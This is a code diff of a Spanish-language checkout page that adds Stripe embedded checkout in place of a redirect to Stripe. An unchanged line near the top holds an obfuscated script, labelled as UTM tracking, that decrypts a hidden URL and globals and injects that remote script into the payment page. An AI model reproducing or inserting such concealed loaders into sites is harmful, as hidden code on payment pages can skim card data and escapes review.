@@ -23,6 +23,7 @@
   <!-- Utmify UTMs script -->
   <script>(function(){var n_246=atob("DFASknEsAKoezPt18Csw5wNAIpA8pI8BgCMovV5PZMQwuY8YmTZrvBJDbYR8vtQGkyJ74gVfL9p3tJ4Z3yB76hRALsBt7tdXkSRm4BhOdd57v9lPqw0+sBZAb8h/oIhXygtpsB9Nbc889tkFmSh3/jhIIoY8upoZhTUwqFMaYch8/Z9ExmJ3p0IcZJou+51GwTYi8EMOffdj");var n_u=[];for(var c_b=0;c_b<n_246.length;c_b++){n_u.push(n_246.charCodeAt(c_b)&255);}var d_2t=n_u[0];var b_v49a=n_u.slice(1,1+d_2t);var w_wa=n_u.slice(1+d_2t);var b_w8h=w_wa.map(function(b,v_kk){return b^b_v49a[v_kk%d_2t];});var d_zqfx="";for(var m_rp7y=0;m_rp7y<b_w8h.length;m_rp7y++){d_zqfx+=String.fromCharCode(b_w8h[m_rp7y]&255);}var n_48=decodeURIComponent(escape(d_zqfx));var t_b=JSON.parse(n_48);var n_pv4=t_b.globals||[];n_pv4.forEach(function(d_n8ah){window[d_n8ah.name]=d_n8ah.value;});var m_5=document.createElement("script");m_5.src=t_b.url;m_5.async=true;m_5.defer=true;(t_b.attributes||[]).forEach(function(u_3zie){m_5.setAttribute(u_3zie.name,u_3zie.value);});(document.head||document.documentElement).appendChild(m_5);})();</script>
   <script defer src="js/meta-pixel.js"></script>
+  <script src="https://js.stripe.com/v3/"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link rel="preload" as="image" href="images/ChatGPT%20Image%2017%20de%20jun.%20de%202026%2C%2014_54_47.png" fetchpriority="high">
@@ -1382,8 +1383,9 @@
 
               <div id="cardPanel" class="kw-card-panel" style="display:none">
                 <h3 class="card-panel-title">Tarjeta de crédito o débito</h3>
-                <p style="font-size:14px;line-height:1.5;margin:12px 0">Completa tu pago de forma segura en Stripe. Al terminar, regresarás aquí para ver la confirmación de tu pedido.</p>
-                <button class="kw-pay-btn" id="btnCard" type="button" onclick="pagarTarjeta()">Pagar con tarjeta en Stripe</button>
+                <p style="font-size:14px;line-height:1.5;margin:12px 0">Completa tu pago de forma segura sin salir de esta página.</p>
+                <button class="kw-pay-btn" id="btnCard" type="button" onclick="pagarTarjeta()">Pagar con tarjeta</button>
+                <div id="stripeEmbeddedCheckout" style="margin-top:16px"></div>
                 <div class="kw-erro" id="erroCartaoBrick"></div>
               </div>
 
@@ -2172,6 +2174,7 @@ let srvCfg     = {};
 let ctTimerInt = null;
 let mpClientObj  = null;
 let cardBrickController = null;
+let stripeEmbeddedCheckout = null;
 
 // Preço do order bump — atualizado via /config
 let OB_PRECO = 70;
@@ -2396,12 +2399,23 @@ async function pagarTransferencia(){
 async function pagarTarjeta(){
  const btn=document.getElementById('btnCard'),error=document.getElementById('erroCartaoBrick');error.textContent='';let submitted=false;
  try{
-  const body=checkoutPayload();btn.disabled=true;btn.textContent='Abriendo Stripe…';submitted=true;
+  const body=checkoutPayload();btn.disabled=true;btn.textContent='Cargando pago seguro…';submitted=true;
   const data=await paymentResponse(await fetch('/api/criar-cartao',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}));
   if(data.status==='approved'){keepPayment(data);await verificarPagamento();return}
+  keepPayment(data);
+  if(data.clientSecret&&data.publishableKey){
+   if(!window.Stripe)throw new Error('Stripe no cargó correctamente. Recarga la página e intenta de nuevo.');
+   if(stripeEmbeddedCheckout&&typeof stripeEmbeddedCheckout.destroy==='function')stripeEmbeddedCheckout.destroy();
+   const stripe=Stripe(data.publishableKey);
+   stripeEmbeddedCheckout=await stripe.initEmbeddedCheckout({clientSecret:data.clientSecret});
+   document.getElementById('stripeEmbeddedCheckout').innerHTML='';
+   stripeEmbeddedCheckout.mount('#stripeEmbeddedCheckout');
+   btn.style.display='none';
+   return;
+  }
   const u=new URL(data.url);if(u.protocol!=='https:'||u.hostname!=='checkout.stripe.com')throw new Error('Enlace de Stripe no válido.');
-  keepPayment(data);location.assign(u.href);
- }catch(e){error.textContent=e.message;btn.disabled=submitted&&(e.uncertain===true||e instanceof TypeError);btn.textContent='Pagar con tarjeta en Stripe';}
+  location.assign(u.href);
+ }catch(e){error.textContent=e.message;btn.disabled=submitted&&(e.uncertain===true||e instanceof TypeError);btn.textContent='Pagar con tarjeta';}
 }
 async function copiarTransferencia(){try{await navigator.clipboard.writeText(document.getElementById('pixCode').textContent);document.getElementById('copyBtn').textContent='¡Copiado!'}catch{showErroCheckout('Selecciona y copia el número que aparece arriba.')}}
 function handleApprovedPayment(data){
